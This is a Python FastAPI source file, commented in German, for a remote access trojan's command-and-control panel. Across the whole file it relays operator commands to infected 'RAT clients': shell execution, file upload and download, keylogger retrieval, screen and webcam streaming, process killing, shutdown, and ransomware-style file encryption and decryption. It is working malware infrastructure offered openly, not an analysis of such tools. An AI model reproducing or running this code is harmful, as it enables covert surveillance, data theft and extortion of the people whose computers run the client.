import asyncio
import json
import base64
import os
import secrets
import logging
import websockets
import time
import uvicorn
import psutil
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, status, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.middleware.cors import CORSMiddleware
import jwt
from datetime import datetime, timedelta
from typing import Dict, Set

# --- Globale Variablen & App-Initialisierung ---
RAT_CLIENTS: Dict[int, WebSocket] = {}  # client_id: websocket
CLIENT_COUNTER = 1
WEB_UI_SOCKETS: Set[WebSocket] = set()  # Unterstützt mehrere Web-UIs
CLIENT_INFOS: Dict[int, dict] = {}  # client_id: {hostname, os, ip, last_seen}
CLIENT_LAST_PING: Dict[int, float] = {}  # client_id: timestamp
COMMAND_LOGS: Dict[int, list] = {}  # client_id: [command_log]
BANNED_IPS: Set[str] = set()  # Banned IP addresses
FAILED_LOGIN_ATTEMPTS: Dict[str, int] = {}  # IP: attempt_count

app = FastAPI(title="RAT Control Panel", version="2.0.0")

# CORS Middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- Basic Auth Konfiguration ---
security = HTTPBasic()
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")

# --- JWT Konfiguration ---
JWT_SECRET = os.getenv("JWT_SECRET", "ratsecretjwt")
JWT_ALGO = "HS256"
JWT_EXP_MINUTES = 120

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

CLIENT_TIMEOUT = 300  # Sekunden

# --- HILFSFUNKTIONEN ---
def log_command(client_id: int, action: str, payload: dict):
    """Loggt Befehle für Audit-Zwecke"""
    if client_id not in COMMAND_LOGS:
        COMMAND_LOGS[client_id] = []
    
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "action": action,
        "payload": payload,
        "client_info": CLIENT_INFOS.get(client_id, {})
    }
    
    COMMAND_LOGS[client_id].append(log_entry)
    
    # Keep only last 100 commands per client
    if len(COMMAND_LOGS[client_id]) > 100:
        COMMAND_LOGS[client_id] = COMMAND_LOGS[client_id][-100:]

def get_server_stats():
    """Gibt Server-Statistiken zurück"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        # Windows-kompatible Disk-Usage
        import platform
        if platform.system() == "Windows":
            disk = psutil.disk_usage('C:')
        else:
            disk = psutil.disk_usage('/')
        
        return {
            "cpu_percent": cpu_percent,
            "memory_percent": memory.percent,
            "memory_used_gb": round(memory.used / (1024**3), 2),
            "memory_total_gb": round(memory.total / (1024**3), 2),
            "disk_percent": disk.percent,
            "disk_used_gb": round(disk.used / (1024**3), 2),
            "disk_total_gb": round(disk.total / (1024**3), 2),
            "connected_clients": len(RAT_CLIENTS),
            "web_ui_connections": len(WEB_UI_SOCKETS),
            "banned_ips": len(BANNED_IPS),
            "uptime": time.time() - start_time if 'start_time' in globals() else 0
        }
    except Exception as e:
        logging.error(f"Error getting server stats: {e}")
        return {"error": str(e)}

# --- AUTH-FUNKTIONEN ---
async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
    if not ADMIN_USERNAME or not ADMIN_PASSWORD:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Server-Konfigurationsfehler: Admin-Credentials nicht gesetzt"
        )
    correct_username = secrets.compare_digest(credentials.username, ADMIN_USERNAME)
    correct_password = secrets.compare_digest(credentials.password, ADMIN_PASSWORD)
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Falsche Anmeldeinformationen",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username

async def get_current_user_jwt(request: Request):
    """JWT-basierte Authentifizierung für API-Endpunkte mit Basic Auth Fallback"""
    auth_header = request.headers.get("Authorization")
    
    if not auth_header:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Missing authorization header",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # Try JWT Bearer token first
    if auth_header.startswith("Bearer "):
        token = auth_header.split(" ")[1]
        user = verify_jwt_token(token)
        if user:
            return user
        else:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid or expired JWT token",
                headers={"WWW-Authenticate": "Bearer"},
            )
    
    # Fallback to Basic Auth for debugging
    elif auth_header.startswith("Basic "):
        try:
            credentials = base64.b64decode(auth_header.split(" ")[1]).decode('utf-8')
            username, password = credentials.split(":", 1)
            if (secrets.compare_digest(username, ADMIN_USERNAME) and 
                secrets.compare_digest(password, ADMIN_PASSWORD)):
                logging.info(f"API access via Basic Auth fallback for user: {username}")
                return username
            else:
                raise HTTPException(
                    status_code=status.HTTP_401_UNAUTHORIZED,
                    detail="Invalid Basic Auth credentials",
                    headers={"WWW-Authenticate": "Basic"},
                )
        except Exception as e:
            logging.error(f"Basic Auth parsing error: {e}")
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid Basic Auth format",
                headers={"WWW-Authenticate": "Basic"},
            )
    
    else:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Unsupported authorization method",
            headers={"WWW-Authenticate": "Bearer"},
        )

# --- JWT Funktionen ---
def create_jwt_token(username: str):
    payload = {
        "sub": username,
        "exp": datetime.utcnow() + timedelta(minutes=JWT_EXP_MINUTES)
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGO)

def verify_jwt_token(token: str):
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
        return payload.get("sub")
    except jwt.ExpiredSignatureError:
        logging.warning("JWT token expired")
        return None
    except jwt.InvalidTokenError as e:
        logging.warning(f"Invalid JWT token: {e}")
        return None
    except Exception as e:
        logging.error(f"JWT verification error: {e}")
        return None

# --- Web-UI Endpunkte ---
@app.post("/login")
async def login(request: Request):
    client_ip = request.client.host if request.client else "unknown"
    
    # Check if IP is banned
    if client_ip in BANNED_IPS:
        logging.warning(f"Blocked login attempt from banned IP: {client_ip}")
        raise HTTPException(status_code=429, detail="IP gesperrt")
    
    # Check failed attempts
    failed_attempts = FAILED_LOGIN_ATTEMPTS.get(client_ip, 0)
    if failed_attempts >= 5:
        BANNED_IPS.add(client_ip)
        logging.warning(f"IP {client_ip} banned due to too many failed attempts")
        raise HTTPException(status_code=429, detail="Zu viele fehlgeschlagene Versuche")
    
    try:
        data = await request.json()
        username = data.get("username")
        password = data.get("password")
        
        if not username or not password:
            return JSONResponse({"error": "Benutzername und Passwort erforderlich"}, status_code=400)
            
        if secrets.compare_digest(username, ADMIN_USERNAME) and secrets.compare_digest(password, ADMIN_PASSWORD):
            # Reset failed attempts on successful login
            if client_ip in FAILED_LOGIN_ATTEMPTS:
                del FAILED_LOGIN_ATTEMPTS[client_ip]
            
            token = create_jwt_token(username)
            logging.info(f"Successful login from {client_ip}")
            return {"token": token}
        else:
            # Increment failed attempts
            FAILED_LOGIN_ATTEMPTS[client_ip] = failed_attempts + 1
            logging.warning(f"Failed login attempt from {client_ip} (attempt {failed_attempts + 1})")
            return JSONResponse({"error": "Login fehlgeschlagen"}, status_code=401)
            
    except Exception as e:
        logging.error(f"Login error: {e}")
        return JSONResponse({"error": "Server-Fehler"}, status_code=500)

@app.get("/", response_class=HTMLResponse)
async def get_index(request: Request):
    return FileResponse("index.html")

@app.get("/api/stats")
async def get_stats(request: Request, user: str = Depends(get_current_user_jwt)):
    """API Endpunkt für Server-Statistiken"""
    return get_server_stats()

@app.get("/api/clients")
async def get_clients_api(request: Request, user: str = Depends(get_current_user_jwt)):
    """API Endpunkt für Client-Liste"""
    clients = []
    for cid, ws in RAT_CLIENTS.items():
        client_info = CLIENT_INFOS.get(cid, {})
        clients.append({
            "id": str(cid),
            "hostname": client_info.get("hostname", f"Client {cid}"),
            "address": getattr(ws, 'remote_address', 'unknown'),
            "os": client_info.get("os", ""),
            "ip": client_info.get("ip", ""),
            "last_seen": client_info.get("last_seen", 0),
        })
    return {"clients": clients}

@app.get("/api/commands/{client_id}")
async def get_command_history(client_id: int, request: Request, user: str = Depends(get_current_user_jwt)):
    """API Endpunkt für Command History eines Clients"""
    return {"commands": COMMAND_LOGS.get(client_id, [])}

@app.post("/api/ban/{ip}")
async def ban_ip(ip: str, request: Request, user: str = Depends(get_current_user_jwt)):
    """API Endpunkt zum Bannen einer IP"""
    BANNED_IPS.add(ip)
    logging.info(f"IP {ip} manually banned by {user}")
    return {"message": f"IP {ip} wurde gesperrt"}

@app.delete("/api/ban/{ip}")
async def unban_ip(ip: str, request: Request, user: str = Depends(get_current_user_jwt)):
    """API Endpunkt zum Entbannen einer IP"""
    if ip in BANNED_IPS:
        BANNED_IPS.remove(ip)
        logging.info(f"IP {ip} unbanned by {user}")
        return {"message": f"IP {ip} wurde entsperrt"}
    return {"message": f"IP {ip} war nicht gesperrt"}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    client_ip = websocket.client.host if websocket.client else "unknown"
    token = websocket.query_params.get("token")
    
    if not token:
        logging.warning(f"WebSocket connection from {client_ip} rejected: No token provided")
        await websocket.close(code=4401)
        return
        
    user = verify_jwt_token(token)
    if not user:
        logging.warning(f"WebSocket connection from {client_ip} rejected: Invalid token")
        await websocket.close(code=4401)
        return
    
    logging.info(f"WebSocket connection accepted for user {user} from {client_ip}")
    
    await websocket.accept()
    WEB_UI_SOCKETS.add(websocket)
    logging.info("Web-UI verbunden.")
    
    # Sende sofort die Client-Liste
    logging.info(f"Sende Client-Liste an Web-UI. Anzahl Clients: {len(RAT_CLIENTS)}")
    await send_client_list()
    
    try:
        while True:
            try:
                data = await asyncio.wait_for(websocket.receive_json(), timeout=300)
                
                if data.get("type") == "ping":
                    await websocket.send_json({"type": "pong"})
                    continue

                if data.get("action") == "upload_chunk":
                    target_id = data.get("target_id")
                    try:
                        target_id_int = int(target_id)
                    except Exception:
                        await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
                        continue
                    if target_id_int not in RAT_CLIENTS:
                        await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
                        continue
                    target_ws = RAT_CLIENTS[target_id_int]
                    payload = dict(data)
                    payload["client_id"] = str(target_id_int)
                    await target_ws.send(json.dumps(payload))
                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Chunk {data.get('chunk_index', '?')+1}/{data.get('total_chunks', '?')} an Client {target_id_int} gesendet."})
                    continue

                if data.get("action") == "get_clients":
                    await send_client_list()
                    continue

                if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control', 'scan_cameras', 'webcam_start', 'webcam_stop', 'process_list', 'kill_process', 'network_info'):
                    target = data.get('target_id') or data.get('client_id')
                    try:
                        target_int = int(target)
                    except Exception:
                        await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Ungültige Client-ID: {target}"})
                        continue
                    if target_int in RAT_CLIENTS:
                        payload = dict(data)
                        payload["client_id"] = str(target_int)
                        
                        # Log command
                        log_command(target_int, data.get('action', 'unknown'), payload)
                        
                        await RAT_CLIENTS[target_int].send(json.dumps(payload))
                        await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{data.get('action')}' an Client {target_int} weitergeleitet."})
                    else:
                        await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {target} nicht verbunden."})
                    continue

                action = data.get("action")
                target_id = data.get("target_id")
                try:
                    target_id_int = int(target_id)
                except Exception:
                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
                    continue
                if target_id_int not in RAT_CLIENTS:
                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
                    continue
                target_ws = RAT_CLIENTS[target_id_int]
                payload = {"action": action, "client_id": str(target_id_int)}
                if action == "exec":
                    payload["command"] = data.get("command")
                elif action == "download":
                    payload["path"] = data.get("path")
                elif action == "upload":
                    payload["filename"] = data.get("filename")
                    payload["data"] = data.get("data")
                elif action == "ls":
                    payload["path"] = data.get("path")
                elif action == "history":
                    payload["limit"] = data.get("limit")
                elif action == "keylogger":
                    payload["count"] = data.get("count")
                elif action == "cd":
                    payload["path"] = data.get("path")
                elif action == "encrypt":
                    payload["path"] = data.get("path")
                elif action == "decrypt":
                    payload["path"] = data.get("path")
                    payload["key_hex"] = data.get("key_hex")
                elif action in ("systeminfo", "shutdown", "restart", "screenshot", "screenstream_start", "screenstream_stop"):
                    pass
                try:
                    await target_ws.send(json.dumps(payload))
                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{action}' an Client {target_id_int} gesendet."})
                except Exception as e:
                    await send_to_web_ui({"type": "error", "message": f"Verbindung zu Client {target_id_int} verloren."})
                    
            except asyncio.TimeoutError:
                # Sende Ping
                await websocket.send_json({"type": "ping"})
                continue
            except WebSocketDisconnect:
                break
            except Exception as e:
                logging.error(f"Fehler im Web-UI Handler: {e}")
                break
                
    except Exception as e:
        logging.error(f"Web-UI Verbindungsfehler: {e}")
    finally:
        if websocket in WEB_UI_SOCKETS:
            WEB_UI_SOCKETS.remove(websocket)
        logging.info("Web-UI getrennt.")

async def send_client_list():
    clients = []
    for cid, ws in RAT_CLIENTS.items():
        client_info = CLIENT_INFOS.get(cid, {})
        clients.append({
            "id": str(cid),
            "hostname": client_info.get("hostname", f"Client {cid}"),
            "address": getattr(ws, 'remote_address', 'unknown'),
            "os": client_info.get("os", ""),
            "ip": client_info.get("ip", ""),
            "last_seen": client_info.get("last_seen", 0),
        })
    
    logging.info(f"Sending client list with {len(clients)} clients to {len(WEB_UI_SOCKETS)} web UI connections")
    
    # Sende an alle verbundenen Web-UIs
    await send_to_web_ui({"type": "client_list", "clients": clients})

async def send_to_web_ui(data: dict):
    disconnected = []
    for ws in WEB_UI_SOCKETS:
        try:
            await ws.send(json.dumps(data))
        except Exception:
            disconnected.append(ws)
    
    # Entferne getrennte Verbindungen
    for ws in disconnected:
        WEB_UI_SOCKETS.discard(ws)

@app.websocket("/rat")
async def rat_client_endpoint(websocket: WebSocket):
    global CLIENT_COUNTER
    await websocket.accept()
    client_id = CLIENT_COUNTER
    CLIENT_COUNTER += 1
    RAT_CLIENTS[client_id] = websocket
    
    client_host = websocket.client.host if websocket.client else "unknown"
    client_port = websocket.client.port if websocket.client else 0
    remote_address = (client_host, client_port)
    websocket.remote_address = remote_address
    
    try:
        # Fordere Systeminfos an
        await websocket.send(json.dumps({"action": "systeminfo"}))
        sysinfo_data = await asyncio.wait_for(websocket.receive_json(), timeout=10)
        
        hostname = extract_hostname_from_sysinfo(sysinfo_data.get("output", ""))
        os_name = extract_os_from_sysinfo(sysinfo_data.get("output", ""))
        ip = extract_ip_from_sysinfo(sysinfo_data.get("output", ""))
        
        if not hostname:
            hostname = sysinfo_data.get("hostname", f"Client {client_id}")
        if not os_name:
            os_name = sysinfo_data.get("os", "")
        if not ip:
            ip = sysinfo_data.get("ip", "")
            
    except Exception as e:
        logging.warning(f"Fehler beim Empfangen von Systeminfos: {e}")
        hostname = f"Client {client_id}"
        os_name = ""
        ip = ""
    
    CLIENT_INFOS[client_id] = {
        "hostname": hostname,
        "os": os_name,
        "ip": ip,
        "last_seen": time.time(),
    }
    
    logging.info(f"[+] Neuer RAT-Client verbunden: {hostname} ({remote_address})")
    
    # Warte kurz bevor Client-Info gesendet wird
    await asyncio.sleep(0.1)
    
    await send_to_web_ui({
        "type": "client_connected",
        "client": {
            "id": str(client_id),
            "hostname": hostname,
            "address": remote_address,
            "os": os_name,
            "ip": ip,
        },
    })
    
    # Sende aktualisierte Client-Liste
    await send_client_list()

    try:
        while True:
            try:
                # Prüfe WebSocket-Status
                if websocket.application_state.name == "DISCONNECTED":
                    logging.info(f"[Client {client_id}] WebSocket bereits getrennt")
                    break
                
                data = await asyncio.wait_for(websocket.receive(), timeout=300)
                
                if data["type"] == "websocket.disconnect":
                    logging.info(f"[Client {client_id}] Disconnect-Nachricht empfangen")
                    break
                    
                if data["type"] == "websocket.receive":
                    if "text" in data and data["text"]:
                        try:
                            meta = json.loads(data["text"])
                            if meta.get("type") == "ping":
                                CLIENT_INFOS[client_id]["last_seen"] = time.time()
                                continue
                            meta["client_id"] = str(client_id)
                            await send_to_web_ui(meta)
                        except json.JSONDecodeError as e:
                            logging.error(f"JSON Parse Error von Client {client_id}: {e}")
                        except Exception as e:
                            await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Parsen von Client {client_id}: {e}"})
                            
            except asyncio.TimeoutError:
                logging.info(f"[Client {client_id}] Timeout, sende Ping")
                try:
                    await websocket.send(json.dumps({"type": "ping"}))
                except Exception:
                    logging.info(f"[Client {client_id}] Ping fehlgeschlagen, Client getrennt")
                    break
                continue
            except WebSocketDisconnect:
                logging.info(f"[Client {client_id}] WebSocket disconnect")
                break
            except Exception as e:
                error_msg = str(e)
                if "disconnect message has been received" in error_msg:
                    logging.info(f"[Client {client_id}] Client bereits getrennt")
                    break
                elif "connection is closed" in error_msg.lower():
                    logging.info(f"[Client {client_id}] Verbindung ist geschlossen")
                    break
                else:
                    logging.error(f"Fehler im Client-Handler (Client {client_id}): {e}")
                    break
                
    except Exception as e:
        logging.error(f"Unerwarteter Fehler mit Client {client_id}: {e}")
    finally:
        # Cleanup
        if client_id in RAT_CLIENTS:
            del RAT_CLIENTS[client_id]
        if client_id in CLIENT_INFOS:
            del CLIENT_INFOS[client_id]
        
        await send_to_web_ui({"type": "client_disconnected", "client_id": str(client_id)})
        await send_client_list()
        logging.info(f"[-] RAT-Client {client_id} ({hostname}) getrennt")

def extract_hostname_from_sysinfo(sysinfo: str) -> str:
    for line in sysinfo.splitlines():
        if line.lower().startswith("hostname:") or line.lower().startswith("host:"):
            return line.split(":", 1)[1].strip()
    return ""

def extract_os_from_sysinfo(sysinfo: str) -> str:
    for line in sysinfo.splitlines():
        if line.lower().startswith("os:"):
            return line.split(":", 1)[1].strip()
    return ""

def extract_ip_from_sysinfo(sysinfo: str) -> str:
    for line in sysinfo.splitlines():
        if "öffentliche ip" in line.lower() or "public ip" in line.lower():
            return line.split(":", 1)[1].strip()
    return ""

async def cleanup_inactive_clients():
    while True:
        now = time.time()
        to_remove = []
        for cid, info in list(CLIENT_INFOS.items()):
            if now - info.get("last_seen", now) > CLIENT_TIMEOUT:
                to_remove.append(cid)
        for cid in to_remove:
            logging.warning(f"Entferne inaktiven Client {cid}")
            if cid in RAT_CLIENTS:
                try:
                    await RAT_CLIENTS[cid].close()
                except Exception:
                    pass
                del RAT_CLIENTS[cid]
            if cid in CLIENT_INFOS:
                del CLIENT_INFOS[cid]
            await send_to_web_ui({"type": "client_disconnected", "client_id": str(cid)})
            await send_client_list()
        await asyncio.sleep(60)

if __name__ == "__main__":
    # Initialize start time
    start_time = time.time()
    
    port = int(os.getenv("PORT", 8001))
    logging.info(f"Starting RAT Control Panel on port {port}")
    logging.info(f"Admin credentials: {ADMIN_USERNAME} / {'*' * len(ADMIN_PASSWORD)}")
    
    # Start background tasks
    loop = asyncio.get_event_loop()
    loop.create_task(cleanup_inactive_clients())
    
    # Run server
    uvicorn.run(
        app, 
        host="0.0.0.0", 
        port=port,
        log_level="info",
        access_log=True
    )